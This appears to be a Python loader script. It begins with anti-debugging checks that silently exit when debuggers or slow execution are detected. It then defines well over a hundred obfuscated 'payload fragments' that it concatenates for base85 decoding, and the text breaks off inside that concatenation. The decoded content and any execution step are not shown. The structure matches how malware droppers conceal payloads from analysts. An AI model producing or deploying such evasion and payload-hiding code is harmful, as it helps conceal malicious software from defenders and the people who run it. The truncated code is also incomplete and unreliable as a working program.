#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_crmlSOKK2hPzJM = '{%<(<)7w(|P=QR*Dr9{O6Guj|D=IIpFe;t4DuAb&Jdp-%T!B8&K(o_6vINa!ZbST'
_cjB10fGf89MIdM = 'jmRy!lxBto)4mokXE!;qjzO+fWi?kZt(}~YTF_n;Q1D^lGAiYAY0WW_tG;XD%6Ry'
_cbOmy1CcWdbmad = 'RV@{1Jr%<$513QlDEXQhuA;>qs;i$p$<>+h%2*{)#O<Lb&0g=NBsSCEN)e@C|@L2'
_cxuchBrT9sHGbN = 'iGAPrGLM%u-2pN9?1fTEMcU7h>{~sJ3K-s=O<ZW;yqQ`k~_M8#ov{fLh&HkIvHhd'
_crtuD0fHNPTQWO = 'IK5}wj|1at(aj2vUYe1%k>i^($0>4`SgS4{td-HIBAP&vqAh0n|WK<UPZSn?;BAq'
_ctUxmB39uWSG4U = 'Xc-I#7~*Bu^$Sqd+hj(ydqLj<Gaj{IRZtPO+Aeg?tLdiR{WZ-ldWB38epU=3{~`|'
_csg8xZT_uG6PkZ = '$<juF>Boma}{vMF#;YA$}-CI9oh#u9M{#pyzb~zp7eZ%3~>qy&Kn3=-(MY&}<c}U'
_cgdF5ddqGLVWMw = 'ZY^*7T(E)FsjbmH=l!Z<c05u8LrFu7umLTRHa)*^2Ci+Pm%sE1gqKQXL3F(D1=`L'
_cqLBvOhMjyTTnx = 'Bu?*fB(0l84iiS&@9i<PSp4bnxMuU)iUzBd9KuLqZ+HwEwMPZK;c5w{XF#>BGlhI'
_ccE5URYit8AUt4 = 'wQ-a@s-{#hXzkX3Da$-0Q1Vdf==$5dYk7lQoP&=K-JNypL^x&)N1&7BfLUOF_OXr'
_clA8q5e0ByXb3V = 'rO+l{_yl>9I`m(-E6H`lSQ?htG`}d*8>WWX_{!n9urYhgW}NJces$lWdlr}u%s7w'
_chk7mDNGBXVUav = '~F{R?M{k~qbkX)>}@(@zu91cJy9XQuX5ywtdoniB_P2($~Vc)~r{5pPCBnhu*Y9Q'
_cqeI8K76Ck2hvL = 'M`iW=n#tBo!-5LJSx2VXIIT2i{t6*-7;Nm)B5Y>{~fN+F8}NfzAToLGp;ibx{bNH'
_cyz3j4S9mPjsYF = 'km>y^(l^!o$lX$X(2aHi@%2aV4}D>@e(w!NtIWK5}_klhA=>Hr{d0+)OsyNv=W9L'
_cbkZPKKOOpUacR = '9*HgGvFi$&9h1l+wz1G3?kCi^=Z*>Zb($_-!q_&BenHQ^q%7|#mm?|R)<sf1O1zD'
_ccimV4aCrKIujL = 'h{8<J^36&7vG(LY?g14ZChhL<=1}>F@4?3R$(gHkJTTpOfDF;(Bq8@~z|pz`4NL|'
_caqiXTMxvH9kZN = '{jJ@PNJnw3cnNaL{Noz`bJ1yNlgyFyl^+nntERB^(AogwOF<3{pZTp`@dz`l6)?J'
_ct7ASkhRXWcoKc = 'Bs<r<W0=?a;~adVY6h{*i8%U5RhobcH>W71gMRM|lLwZz%7$c8>vEx}87u}EG0qY'
_cwYSklGxa5slhY = 'BescOKLDvV<B<72_C$RCm(2;<Ovq*;0cMkec*AUVNB{2ahh6w0V(ARwxb`^0cNxV'
_cu0rMd0k9TSWXL = 'e^kpZMD|l-IF{B9)Lhv0f(jd4y=F!L-}4_$61F5EB1VKDQ{jPK9iPF&AiaPTd?V0'
_coFrbvj9jmYZhN = 'c?h0D<$|3UGWe7t>el_Zg)A^2X2nT=P~h%E3x0CV>UM}`TQ3(gD4MmsrNEz9m&E1'
_cx1_ZMED2RMPWl = 'K1JFf=oO@qkca@L*MhnP6k(-ANPd}|u0}=08C%g*?YW9WU{9w{$MNn)xZ51&5zlo'
_ceqoqhicATW_nb = 'Djz;CI6N111N+}2w~GxV?aID*~$G7<|D5*H2>LQvu&xO!y5M6)nSo!E4g0WpO(g$'
_cpwV7KzCBBdooD = 'g3X`v2WZJCc;=)A3s<ito{5)@c&v@-~RS8YjKs{y24~`NwEV^3aayIuHDrhm}6kJ'
_ckGZlgThtA0OS4 = '>^!fl<)c=ZqpGH7X<r{=03geA(Vh+sx$t3r20A%_+mAfXrR7zc_P(PI_q*1RYk-&'
_crH_MiytsrRgP7 = '92;%HQqv#G%aAMk#xke@!p;$0TkoSuY~WOIQc+xQ63T(_`?VgF4%p^E(@x~SJEN>'
_c_eubrw9VUYewx = 'N_s-ay#5uii-HwOwQVpX<%`_n2MB9e>yKOW-iPg>0j>~Xhv6lv>NY{VR6i9)5(7N'
_cwjYpI1leRg0Uz = 'rkNPms0(RQw!RBNRJK{79<q+)J&!C!d8=>w3TOhcslN}+ZqgjkXJ2UA79`iGC|_R'
_cezxp0bb_mSbKN = 'Qx14~D4jMV{WF4{qAO0&ZCv_`!ZSZ4#b6%PnDF=ZE1rI626ns|dk4WBVoLHg`mxs'
_ctrEBmhNIEZuDT = 'i4xcb!A9=rU*pp=j>`oHDS}$w6(|?6L;qPW4cQrAMmShJOl<VXfy8J$AKm*9)5{{'
_c_5JCZOoYcl3yD = 'pnPbx0$TT~G$5-?bTTFyS>g;e=$K>x&0S;x4VMnsN++a#X{Vh0k_#zbmI<<lve^J'
_cqxEbvxPPkk4QH = 'Yzo#;({1DRQwXreEo=!sIRJl<buWsNIs~#yxb!5JkmDWo19hb_E_TXPcQE0%YbI)'
_cf3oKjzEICJZWX = 'C~-7Vn0s%x#;9akIwgUw<89rp^wQ+%9$;^5jj!B)6-mK<#s$vj9`H;%fa{H*jbEH'
_czEgRVKDZco8TK = '<wrmo8TTxup7IL-g~Dp{oRh6r;&)XaArP22&n(wg{`X`a+<_GPx?iLxSufq42;_*'
_cdqAbwx1_grW7j = 'BO*fpIXkZxr%oU6|y5KfDtRsmU*LsV{~}b`QA!FH`e??^SR})A0DG%(`n_8CgrO='
_cd1pzZAktR_ghw = 'V&@HhYl+A^&DE+QPVPNpGNt9f|8z~HX?*`<m~Y&Irc{&5yd6KN_f-D(B?qXeyQw$'
_ceA2l0i0fRMJpf = '3{G$Y(P@-481b$m%&0O3F2!i`Dw$@XD32$Z;!lXm+^rT&qdR=+RN_ceZ+(x+Seq5'
_cvGhZ_8tk7uRVF = '0Fq>wlQI13PZ!U=?UO^jGipV?4+6`LxB^X6(v77fL~ip+pQPI>gdrblV<prw_Q77'
_cuJPrJp3Q2ldZP = '*)s5xyDP8)MV%_wg@ZUra>r!p%%jyksyg4vvAxD<2LP@NTqZDq{cUK^JJMi0X{dm'
_c_lsPpgkRZ3BV6 = 'd~{dM^GZpqQ!`}Iw*UqYB-%_3j7t+Z^;xy!*kr~j?+{2e0}c(3y0z{KkO*jPZQ3b'
_cvLYgIBQI_Vsld = 'OxIVAA_3m}`<Aj)3(~jQp<sfDqWzcbJbs~^iJ^F}q%uZ?9(qEb=QkP+R8z`G32+~'
_cwGCuIh9KaqvEi = 'BNItpo7@;_S+_ta2_usaF8X(YwkG8}Q0u0sKK6`YhlsUbd5Krqrer5xuML1A|Q9<'
_cozVbpSrNDFTmy = 'X1SSP7FU&kSMuoE8nfgCQxvmE9n4A0zVhB;+V?mH=OUg7AtmAg-7jX+7K1sgLx2#'
_ci0rAXqsHGYS_M = 'D9q_%14&rGkOr$~lzLbTQNEsXWXpw?I&Q47R#J@;O_xw^NIX0F=^8@5~9E2)`588'
_ccqwJ7blKqysIV = 'aePmKz^Mg{H=6q!mZ@y<{vyXB2xUFFhuW4)YzAt0-Em~b@E`(FdKx&k~b|E-g>gd'
_cbzQ4YCC6CabVO = 'V}S<ihgThq=BLD@+)0XF1~?k^)^hZ>1TC6sorCchW~pV5CJz-oBdVdVIvn}V6|S`'
_ccRcsdzGZhRgxg = '@{!|>AjW4d__LDEWD3a&?FZ18f0YfNKA~II^j`8~T<20Jj2Nbw+FwFe+FJvbb>5V'
_cws0Q3zaAg_UBO = '?W5ZqTf`xy%jp(dNAEr`kPB)=0#3E>nuycB%5B5`=t2A5c^RgEl1OpOyhd5A45AG'
_czSXVdDgHHnUfI = 'tq?qcmFUZ8KyA8i~V?NL`O0gC?Y6^#QGzXtNpaJ}nN|ucYkgW4>2+R)uwYop9ZP^'
_cx7a7J1VFv208c = '9sXKmFH6@+H8N+eHaPhdlh><$Zcobf!nG_p>x**c{h<Lmzidpnz^ISjt~4|!s}%='
_ctgtQMMmQrdhZ1 = '-&ICEpaH(HT}Iq5N%{w~8b|6@$}sN1USM1Q-gE5#QUsNiM?G2A(Cod`ocB5i<GV~'
_cpmegyxECU64NP = '%>w;IYXh~5uo`L4JzNh0mOHcfN<E2MF*hv}B&c7BJY9yp-x)dYikgu#lWu+rct)u'
_cbFc1T168MKjKr = 'E}rFu`NdB4|Q{C-Z<VDjXZHJ3(#=Qqtp%bcaknTe-#DRsDK)DNj{)~5=dm^j}Uf^'
_cwUTerJytxN1wU = 'r~admvah*3+~Z%C}MeYYfqvzr&*@`#{8Wr7!~p^{Ikt=81}sN|Y#eX~qoT*LX*zD'
_cyVaCCZgbOcxZe = 'GnJ5#?9iN!H}L;wm^2lxp43#1sM(vZCPtYD@`qsD-8v18RmW`O?Ay5x~j}7VQEib'
_cnA_enwKYj4Jf6 = 'FC!F4JI{|RsoLmzUj=1Ccu_*x-m$yQ-7fT!&O7J#LdjO$#+Khj?byVJ7U-QtOsF9'
_csjSXsFEmc2ywS = '`0U>I*{Hr@O^tk?eN+<Gr{wnVqhSK}ON57rGrKhP>IbZUiD4e=&2gFj{VQYx>{rD'
_cgcRh9CX0j6Xb8 = '~Q;p;-vJ-^In-al&gEeN5pr#PZ`ycWN^4F$27HfM0$*aTpIOM#SMw)t6zX9G;csr'
_cm4js7BTWYrNyp = 'm!q3emsThnkl)2RQ6EbnknyJxSwP?p|L%u$%tNIlbQ+(#aHkEZ>F^GMnW)p*j3mC'
_cfVD56MgFoX3Fp = '-H?r5fNQsZdA<aP=RNPf?V9a=F<<+@5Z98UCvqarumo5bXQ(xbcK)PDEWMOif9{k'
_cm0rvy8tUi_pu9 = 'q3?wt|9|oY2FvN;*ldRJT{8z4lLES4{8M$*abwov&ea+K*UWK(f-otMfoqWu_0H='
_cwvQkSAT_PLpWr = 'b=cG)mTw^R2wn4nmuKLo$mz0$<ZWPNTy&0Rne#E`|Q;YkhW<>twHqv>%UEQ}-Qu}'
_cdVzTs9NO4NtgR = 'fpIDwTF3n^D?5O_MQF@&7jbVCVUgs`;5Vm@KzsCwg!f~xr=(x<xZ%CcCreK71kzk'
_cjL_66b94BIHCW = 'mR@9I~I{*N9dStW7<&oF`qFh(M-%NvePDxYK^LMmkdt)}48>PGb=+@-^Nbx+OR+e'
_cynVgjenR4vEz9 = 'nu~cXzSh>;bt9x8f~#{h2E&#WT4cl^O`kcwdZ@;kd>n%eED0|j23+)wlTNw&ZB9m'
_cuajCOGASlnakx = '#Jr!N6P0R^4RF<J-!ImIMG{VBCQ~5!F(vzMXteMiIAZ-y&fxmC{Zi0`MQ#?7(XjA'
_chy3qLmC6P9bY1 = '0Ol!KPtn-h3+da6Kr38yX+bTv}gtoo9&pIw<1jKKS#Fu@BCFpeHGbei`BtXL(GdE'
_ciRD4qKCfF71CQ = 'mhrdv`;U8vR-z1JfIq)!~7Uz(6<WElbA(+ip2m=&(&K5yQVK#PE*Gp5%Xa+LZYYi'
_czrQvu5WiCgX3G = 'R|%ChaDL>@@=vgV)kxY|_Yx*sWT8Pph%da)Hv=srTjB-IPDM(ubA1kGdM$l{DZPh'
_ca8GB0HF7BLJ_L = '*~d+mJL9wW&$xL{eg?{BUS!tASt>KMjM4`N_bR1`wTjn7XLk*UbbJ_?0^du4-ib}'
_cyF_CMoyUnDgbU = 'wzC49%i(;S>iw2+4i0Vver&Jb-C)WElGSUY563-JgOdZHT_A?x&}<6lxzHQN!bE7'
_cvEATFy0_KgYeZ = 'JW6zZN{UmPVI8=#|uO)<##qigSJwVqT>t{MZt#jnqmvhJo0ia*UceOzNNRIpiR;i'
_ccccGkvlPBLAGl = '#mE%>yKzyVvSP}F<)bji5{3Y5^N-8KHdd9cP(X(4aGBNud0)_4LxFNLUFO8pW<xG'
_cnFOvUb3BhsRj7 = '1QjDs<2aGv^*=MaDIcnSniF@E0rwkV=ID(O2{Ho|og4cPM58U$M9YnV?E8g*b`2d'
_cxchu_IN1w1Iu7 = 'QgP2NwGAC3#&<Euq|T<A~1-wnMvOT3ekprMf98f)s(=He?!RjpgkqNg-U<E5MfJc'
_cj6A0GnkyYikVG = 'tlyANK<qCr%3<c}x22$G17EsDv}NaZ0zojL{qOt_gwxKnTJ+>~6G{4%cOu*7C{Kz'
_ccqDR7POfrRrwz = 'ZA-!*&BoW4cLUBNRu3T1!5ZpsQ*a?JPg|xo(HGs@|Hf8{*yWH*c3PwdWgdWeGWJ`'
_cwQK_9LAQfIBkh = 'YH-vQ{hc`A}AUy@%_gvteNfifi=g*cA^Us%7LT=&A^o;hNuvXU12`ya3`q3g4qW+'
_c_Mx3Sqi9kS_7K = 'OQy#_n&+SHT&Os3*)Dr4>-b%z;pME*86K%{Mr~`b;UKO39wfe_&zhwwKW$L$gJ+D'
_ce51tsYwjbMGOE = '}+fJR=*BHcdi#icPU8lmuOljM0-iG1TbO5GDj|~WW-Spg<<{<THFJ_#4{_l=uvQ+'
_ciWOb0Lb61UJsg = 'WXBJfIGTD<pEZ>t)6z)C`%c(#iF%T@c@L<wwF%2rrpHcJp!>#k$IPV>7S4oJSURT'
_cibbKWaUohmvT2 = '~x<bHaLfeDbxsCI*i*06<*bK!?a&``h61Mtei_{RbWE)2aL!DG7XccBcvwxI1NcR'
_cfxzb3iQoWsfaF = '2eDlTS~fw;)+FYCevA0c3w=Q-mPXG9ql4(S+Te#>8!7oM=}m97+nDbQH7UsD0^Au'
_clFyYtPaJG_SbO = 'cx;s9tD?BSO#cQ^@32!@(^ZY~e>Y9@;$I6-G%iD2eTktqTo}>Tum%ITSp_IG9<b6'
_cpebfuZCzNABiC = '{8=vAvjm}h*(%$0511aAcVJXb&!mN--5=>l1?_~{3{Xz-VtqXkfdA=l64#&vP&TT'
_cyhoZTvc3wI_Qd = 'E#jU2SwLYMs3<;R;c{tO<|@(1B8N`~Gi{&h5v^ha*(+SE2Z8|Qv`+-sk%oN(E9|;'
_cfQ0rpksQbVLkP = '@dN5=9r}!iMOpNMoJ#!#yMU|&&;}EnOS)L0E8au-{EZOy2b2RTqcsp%wu1bjYh0G'
_cf_DwXRpucWHlA = 'S{_7B$(?+COnE14NgFjc`%-n^vUxeRjjZv0PAcrUnJaXvVrPo0y_PZ4c*-h*@3(l'
_ciPnX32tFWyMTo = '06eDJMSV`>xrbx+m_R(4!X}SNA`5`sP1qgp;S-=SEM@D{^2CMw?VCD<p@+k0U(>4'
_cltXtXaz0XpQMs = 'JxE!AB=_dnWLO?KXH8~wb|0(lXKhYM;=stGp7VC>4-0+dmy{lSk=&5Fgr*I@Ka&q'
_cmA0cCRdCWRzID = 'N+i-rPvn58SZV@BAr5_(UTN}Oxq-pmF`GqHRAn0GQgUT>Slv$g#fAqjkkMGshP{P'
_c_SgT6QhBcNsgc = 'MB9I?#Jl!D-Wx}2??XM#5^6RpvF<BT?UTX^O&aPVB$qx7xx?r1S>{g-siceGup4{'
_coMOT1dzZ76KO2 = 'Jap<9MMV>qP>wK(Z{ihg%{s2G*JE$5NmHtXZxw0l|PQ>+S~*9sMR%_V`vrio|Gvu'
_ce8qOR7SJC3MMU = 'nZow^+nbtlQW=Ue?T;?n0AE$zkvR!hFv6i+#1cSKMv!?qCr<N<;VpxbGtC1Cny;z'
_cp8KsW4XwRvI0T = 'Q~1kl_1)7=FJgCzGY|y+^`gI6E5QPqmrz_ULi)Eky(tkr-@_|w07ai8_a{zWM`t@'
_cxi1pcz0_35nKN = 'J3DV&$5}$cb~D?obV65yW&;#0WHL{}$DrG~QPskC-|uKP>X+4Z>!v3sn<QXUfT^-'
_cxVVp_AeQ5bySy = 'iL=K=guH&HRrzye=Pb<-?l8p$C>L|HLr}C*^)QPse`(}`{=w;9juO8Uisb3|IAty'
_cwWZnWQ_Em344j = '0!^jp*av10MFX*1Qkm`{$fkaUFpEYY1xyeM%8UXOJoP`|sgq|L4{FC}uZN%@VE6y'
_ck3q9DUc531afz = 'Ga%8#vAeF4DHr&(B}kjb<*vQILeIg9l!)kdElFzwngzQ%<PifQNwe%weSBn&yzKO'
_carwQMP7S7Em3w = ')x)Re?lMY2!FOoM9s}`U3THu8Ve!r$yx#475LuR+-}X{1o7TCN`#p!05=_+i&FfG'
_cqSkQWMOMnqbsC = 'h=mFthMWl_0erMjdgHsKEnr`QWk{va#FHvkWSyh$T=Aml1T0aY4I5sKVN%j`1Mdl'
_cjFaxnT8Ajpcg6 = 'IggfVRbv>=;XzxrUkFN%RlrI_e6Z9?&Widl@J85zeptsZz-W>DKld=`-7a>Pw^cI'
_cdMvJpV_v6mSDV = '^cr-SQ3k_qky+$w9j>Rhy`ttJ~2Zft1V>yIH{`5*1*FKPR6;$d!eL`P3uI|vbNnA'
_caKyBOijKYp96F = 'z~u;Ae*y!hFB$?i~0QOtX<jE%wWAB{A*y9;Mnuw<l0e5NSFb?LSWGe*-uN{+41eN'
_clePVc_F2V4GDv = 'g%0{DzxGsZu#x5xqbS*J0!4~mFV7dIHs6qX7VnOo5s;T?0h~>lAOa3{t3E}AVfWh'
_ckmBigDojipRQ4 = '>3R{XlQCmu3-g`S5(C&dwrFz?qbM?b&qM`9U>*Id7X)YA1L%^q8>~gF?RH;Pm1qb'
_cjm0ByWwEgbxMU = '6w_Ba7#;`Hee9j7n-!H81cM28Cf}Bn2qjsK!R5ZrGDH||W1R8sxO+(b4P>wLfgw$'
_cpEg0FKogIa7OZ = 'HlFM*<WwS6b74x_k4x;9@Hs+t79`4|&PK-eDR^JGNqi(qtQ2Zv~07bs`=9H7qKKU'
_cfkt9qDD7etFdm = '~mr6xqlGiDGM0e>}&41ux*YU<&>$;TStK1c*X7R(_W2%}=XI)^BTjA)P1ozpyQ88'
_cn0ZITg5vNi3Jy = 'jlgXF8;CLpV~<TZY^NoIoYyG*YZ1V)QR&_NwDVt59)~3T>jahP0vw?QQu;l(oG1`'
_caUnDbSpBjAjoM = '$H{y#vHxKDSHU$SGp95seo`!1M2TxHKh`u2UWa>mZ(?E=VQ=BvpPS>R`ffF-_5_m'
_c_8OBY4QwkZeT3 = '^`e%~kViD)9Eu43C&RqE{fpw<us{DwfG3`@F0N378QpmxtY~F=s{a4kcOwJw=`vm'
_cennHsyVPdxTaL = 'Ve9{_8ay%Ystt?b4gpIyEQ@6n+&Rt~4lw7$a@7YExTChLil?gCjro9=zv`+UNy&d'
_csIeoJRxODKwxi = '=CC7)FD0)@*XJiUU)l0@H}CW=kKIP9jb{CL2=b!m=odHv8AMo6*Dzhq=OF8t1-E)'
_cbGMQWfzMPeW4k = 'Nkt6M8o%P=k0!3Mfw;6hUdnd+PyHq`o&$AyBKYdHWo*Abx*ZDYeqJpG;!f3^SKj7'
_clgksRPj8wUXJu = 'E%=0(J7d(ENMedqwlg-`Maz0bB8*=*lYpdJkPutEd(AqR^}Ae-sTyh>e}VNW-Sg*'
_cc0cFoVkBImEuS = 'gXRUHD!l-mtE6Jsjvhe$#4_3f{cf7aV?dxYiDcg%Hc7xK#9c+&}UM@S&?n;6zy56'
_cgEQ7uZ2S_jtt_ = '#z7+LVua!l3UDj*@8$<^I)CpU!*EkTcb1)vBg`{Td~CJY`{%6aBP7kJNv5k64jUd'
_cbJLwQvCgSEgBN = '^4DpDF$jF&i{qd<L3;4rQHfNm%!U*Aq$LUk_|L4cls&?qCY);GZT`^yhOxpN5W}r'
_cpZ9HdJQUfG0i6 = 's`LYWsX=vJrwa#T}hS#ewPXAS1#a!ydlvpJYf|`UKWzCERR>CveE=B=0Rz(61f&~'
_cpKVu66uBhJmwL = '*~pg>0H~-#%Vv}15Jh};2rT?`oMDPm8Jj}%{@_I~_YpGHxInT^TQuPD{;Ta8ijw='
_cbf7OCYwtxXGO4 = 'O1JgA3Fqv969$y@{-ow9wz<RkKL;qiVI5xrZ06G^rY6@Rglvk<15ZgX-)1vIbA0L'
_czxKGx8lmKtb7f = 'DtGtc#louFxN^;1#rgS_X_<opu0)9-VjF64-gEN&5@r^!uow}s{nERr<MJlIdp+b'
_czYM1mtzzJqfUt = 'GI_Z}VasEnV4M9-8+$O#}H3$1Z_irqve(h6p2QdR5{}`CE}UM2B&JfP6dm48_`3!'
_cuh5uBHbjM7Ypi = 'kb$bR+xFdFXexEn`$V(594(&K#TUnAeU!F32%VG>gVc;sZ+|xmU<feO$&>R0OQU%'
_ctL7uxgCENdnKb = 'F!|(ZU^<HmuP9}7+Q8c2C6>AB+skqERzBSSjL8b*_hq2<z2d)cS-lKHfQgUcV7C@'
_ckypexiOe1Jc_L = '_nHtk-DTx~%Va880H0*%fOEi~nF4Y1GTcbe0E06Ycgd>Kq_+S3e{@gdZ#d%_tswY'
_cwaScAQbm99t7V = 'ma18bF-e+NgtG}0S(W0So=nXKxkz^!M4xY-8}-W|u=Sf>`XCJEvvwS3<tfDeCkMG'
_ciQ3MSLAR_3xVA = 'B?2m~su#<gj^*Stq|zR3zJLy%B@PC$bO`+O7U3UOq3<=x!dT!~AW^?SxyBgnz~i3'
_crONKBNXRhXM4j = '+)Ug1#VUXkfLloRI58#w=ji^S$CyZT=WCc4YykeP_hs)bE-Ng&Tt`a@H-;6#V1t5'
_ckcWF2duUa4xBD = '?Sy{~=0gha7ga-K%4^tFcDU~5$p5{0`FU-Dlr=c(^l8{(zuUtbATW^9raa)Vic1G'
_czX2nGDhzmvJtQ = 't;7%zip?(qCt_rFUq4hfAu|jacxxTRz)e4n1`?omm04M(CHKhF`J4uH}<_|gfN~H'
_ctvNuO4A3Fxmb8 = 'em=Fw{~Wb>HcqIr~%wU}@uD^_*@`TkiA(vl(qq89iMpa6;oC@S=#=_Orhku$wu2+'
_coPZLn1_6gzEec = '*E&QR4M8@JsExvPun<<1(B7&zb#@(VP%7<~n}W1_B+QT&|rG=G0SyxL<}4CCjG(y'
_cgjjWQyy05yOyh = 'aziLEVaB!q*UESza8sOzd~%%wxZx}I?@?RgU)Q)NH{?@)!Vrwzx>^xTSLD79EmS4'
_cfDsLn0auXTlqR = 'm7ochwWWo>uehxbZ~_nT#3eCBz^kxXqKz8)SD1OMor^V=AZQ1ovaubevvguhq?zB'
_cyLm9UdeunQHkj = ';th%i}#^-9Yr>!8eiF#*6gN6;MoVW{G*SQ^_xSSck$pp1WRcoBHzwsF%dxvf1k5G'
_cswFUvPxaZc5o5 = 'cy9dBF=diTc4z8JqQcvM6wyL@V?h;(P(^?G$RI{KNRK@Y{%LXN`nRk0oAO~4_h|B'
_cvdoqSShpQSxNp = 'Txu8}D0(t+kF-MMVUqo?L<rhKR3SA@@u!CNtoHhKBd}$k@Q`s#V{u2rDCeFFp^SL'
_cbGMQNsbKlSofG = 'aj?2HUNRVV63NOD*gCdc1gf|H{*1x9=uPAm5kHoeO*(S$1lIe;e>S%gl0QSAX}9R'
_cgjAEyfdBik_U0 = 'x&(Cw;@`mW%p={zRSxB;biJjVTK#EM*8Cp|Q8nAd#X(F>8Oy#CQ;Z(eN+611mHxm'
_ckG_vOmFBQppqX = '?|HyrGP80$&G4!)cvkvwEw*gy_H`$;58T1403`6cUjzmdCQnv(j<w{ckH{uNae<M'
_cshq00LAjP1lgv = 'wTIP=LHB2{4WanN_FwE%=S!d$lp%(wB@fy>OOL|Ki;ibohR5(V@MIqQfCuQrb?5%'
_ce_aMiIfv_U4GC = 'w%yc1lgW!!nAbtVhugBGrQJMc!SS2&dI=oUAj;jj3G7D+7sP2z=2f>+AW$_tg4Kx'
_ckjEa3b1L5nzNf = '&NsT>@JVs#p_enJhEGTtU337+OQ&(sGZp24dU`6ZH2e$@<K}$kAKe(4qe3%l5mY@'
_cqVm47OBL6or22 = '9J4hNbZg|b8w{cVLke<M-SG_QditGfC~-8;wgXT!=`si@_mE*hY!yFWbQ%*ek65I'
_cjGvk6k4SS2zzp = 'j=yR<K5n92s4_@6Z`0}D_xqW#dRuw->zm$0-OR%Xpoy}_zHf3bM<uYd<e0h)eGxd'
_cwd6VZmUA7dqiN = 'TRlWRdzrcx8i54Xg*?9jT<Aj;~8#w(-993~?O)YfK4+(~Je&!WF5vIa>^lkIUBDv'
_cwiPjsVIuWf_p7 = '(1ok%}F(`T+cYZl`(kZZY<>m-?M_M`AWWnh!p$a_cquzQ0N9LIaen_$1P-_P!_bA'
_cd0CRAkCeYZm46 = 'B*K4B$D)uo8bjpbdAt)Y-^)XBGK0{Z7RltHl5Rs*k|{FESqKEWQcWhBR(B4qQ&Bl'
_cnlysgsyGerWm2 = 'x~1uIu~Hk;fg$s}*0Y#YrQLUMl+(|D>jOg}kN;Lom2uz>SshUPqfn>p$qy>PW8_U'
_cyxLZPSfRF8Efo = 'T&w^oJTBT5Am_f?Mk}_UQ8xq{p*~iKrPy>vJblUuy10)OOisFAtWrg+TUzH8`{H`'
_ciIbdr0Xxx8FMk = 'Cn;?sr&7&Zi7+y'

_piBwybLF8hb4t1 = __import__('base64').b85decode(_crmlSOKK2hPzJM + _cjB10fGf89MIdM + _cbOmy1CcWdbmad + _cxuchBrT9sHGbN + _crtuD0fHNPTQWO + _ctUxmB39uWSG4U + _csg8xZT_uG6PkZ + _cgdF5ddqGLVWMw + _cqLBvOhMjyTTnx + _ccE5URYit8AUt4 + _clA8q5e0ByXb3V + _chk7mDNGBXVUav + _cqeI8K76Ck2hvL + _cyz3j4S9mPjsYF + _cbkZPKKOOpUacR + _ccimV4aCrKIujL + _caqiXTMxvH9kZN + _ct7ASkhRXWcoKc + _cwYSklGxa5slhY + _cu0rMd0k9TSWXL + _coFrbvj9jmYZhN + _cx1_ZMED2RMPWl + _ceqoqhicATW_nb + _cpwV7KzCBBdooD + _ckGZlgThtA0OS4 + _crH_MiytsrRgP7 + _c_eubrw9VUYewx + _cwjYpI1leRg0Uz + _cezxp0bb_mSbKN + _ctrEBmhNIEZuDT + _c_5JCZOoYcl3yD + _cqxEbvxPPkk4QH + _cf3oKjzEICJZWX + _czEgRVKDZco8TK + _cdqAbwx1_grW7j + _cd1pzZAktR_ghw + _ceA2l0i0fRMJpf + _cvGhZ_8tk7uRVF + _cuJPrJp3Q2ldZP + _c_lsPpgkRZ3BV6 + _cvLYgIBQI_Vsld + _cwGCuIh9KaqvEi + _cozVbpSrNDFTmy + _ci0rAXqsHGYS_M + _ccqwJ7blKqysIV + _cbzQ4YCC6CabVO + _ccRcsdzGZhRgxg + _cws0Q3zaAg_UBO + _czSXVdDgHHnUfI + _cx7a7J1VFv208c + _ctgtQMMmQrdhZ1 + _cpmegyxECU64NP + _cbFc1T168MKjKr + _cwUTerJytxN1wU + _cyVaCCZgbOcxZe + _cnA_enwKYj4Jf6 + _csjSXsFEmc2ywS + _cgcRh9CX0j6Xb8 + _cm4js7BTWYrNyp + _cfVD56MgFoX3Fp + _cm0rvy8tUi_pu9 + _cwvQkSAT_PLpWr + _cdVzTs9NO4NtgR + _cjL_66b94BIHCW + _cynVgjenR4vEz9 + _cuajCOGASlnakx + _chy3qLmC6P9bY1 + _ciRD4qKCfF71CQ + _czrQvu5WiCgX3G + _ca8GB0HF7BLJ_L + _cyF_CMoyUnDgbU + _cvEATFy0_KgYeZ + _ccccGkvlPBLAGl + _cnFOvUb3BhsRj7 + _cxchu_IN1w1Iu7 + _cj6A0GnkyYikVG + _ccqDR7POfrRrwz + _cwQK_9LAQfIBkh + _c_Mx3Sqi9kS_7K + _ce51tsYwjbMGOE + _ciWOb0Lb61UJsg + _cibbKWaUohmvT2 + _cfxzb3iQoWsfaF + _clFyYtPaJG_SbO + _cpebfuZCzNABiC + _cyhoZTvc3wI_Qd + _cfQ0rpksQbVLkP + _cf_DwXRpucWHlA + _ciPnX32tFWyMTo + _cltXtXaz0XpQMs + _cmA0cCRdCWRzID + _c_SgT6QhBcNsgc + _coMOT1dzZ76KO2 + _ce8qOR7SJC3MMU + _cp8KsW4XwRvI0T + _cxi1pcz0_35nKN + _cxVVp_AeQ5bySy + _cwWZnWQ_Em344j + _ck3q9DUc531afz + _carwQMP7S7Em3w + _cqSkQWMOMnqbsC + _cjFaxnT8Ajpcg6 + _cdMvJpV_v6mSDV + _caKyBOijKYp96F + _clePVc_F2V4GDv + _ckmBigDojipRQ4 + _cjm0ByWwEgbxMU + _cpEg0FKogIa7OZ + _cfkt9qDD7etFdm + _cn0ZITg5vNi3Jy + _caUnDbSpBjAjoM + _c_8OBY4QwkZeT3 + _cennHsyVPdxTaL + _csIeoJRxODKwxi + _cbGMQWfzMPeW4k + 